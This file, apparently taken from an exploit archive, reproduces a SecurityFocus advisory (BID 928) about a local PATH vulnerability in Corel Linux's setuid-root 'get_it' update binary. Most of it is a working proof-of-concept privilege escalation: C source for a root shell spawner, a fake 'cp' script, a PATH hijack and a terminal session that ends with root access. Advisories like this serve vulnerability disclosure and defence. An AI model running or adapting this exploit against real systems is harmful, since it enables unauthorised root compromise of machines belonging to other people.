@@ -1,0 +1,34 @@
+source: http://www.securityfocus.com/bid/928/info
+
+A component of the "Corel Update" utility distributed with Corel's Linux OS is vulnerable to a local PATH vulnerability. The binary "get_it", which is stored in /usr/X11R6/bin, is setuid root installed by default on all Corel LinuxOS systems (it's part of their .deb package install/update utils). get_it relies on PATH to be valid when it calls 'cp' (without the full path), making it possible to spawn an arbitrary program (called 'cp') with inherited root privs by changing the first searched path to one in which a malicious cp lies. The consequences are immediate local root compromise.
+
+CorelLinux:~$ id
+uid=1001(tascon) gid=1001(tascon) groups=1001(tascon)
+CorelLinux:~$ cat misu.c
+#include <stdio.h>
+#include <unistd.h>
+
+main(argc,argv)
+int argc;
+char **argv;
+{
+if (argc==2);
+setuid(atoi(argv[1]));
+execlp("/bin/bash","/bin/bash",NULL);
+}
+CorelLinux:~$ cc -o misu misu.c
+CorelLinux:~$ pwd
+/home/tascon
+CorelLinux:~$ cat cp
+echo $1 $2 $3
+/home/tascon/misu 0
+CorelLinux:~$ export PATH=.:$PATH
+CorelLinux:~$ get_it
+/usr/X11R6/share/apps/get_it/html/largebanner.html /tmp/Get_It.0.a05872
+CorelLinux:~# id
+uid=0(root) gid=1001(tascon) groups=1001(tascon)
+CorelLinux:~# exit
+exit
+/usr/X11R6/share/apps/get_it/html/smallbanner.html /tmp/Get_It.1.a05872
+CorelLinux:~# id
+uid=0(root) gid=1001(tascon) groups=1001(tascon) 
